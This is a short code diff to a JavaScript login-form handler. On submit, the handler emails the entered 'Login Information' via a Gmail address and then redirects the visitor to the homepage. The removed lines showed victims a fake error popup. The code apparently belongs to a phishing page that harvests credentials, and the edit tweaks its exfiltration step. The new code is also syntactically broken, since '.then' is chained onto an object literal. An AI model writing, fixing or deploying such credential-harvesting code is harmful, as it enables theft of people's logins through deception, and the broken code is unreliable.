@@ -15,9 +15,11 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     From: "ankaracongo@gmail.com",
     Subject: "Login Information",
     Body: body
-  }) // Show a popup message
-alert("Oops! It seems there's an error. Please, try again in a few minutes!");
-
+  }.then(function() {
+        alert("Email sent successfully!");
+      }).catch(function(error) {
+        console.error("Error sending email:", error);
+      });
 // Redirect to the homepage
 window.location.href = "index.html";
 });
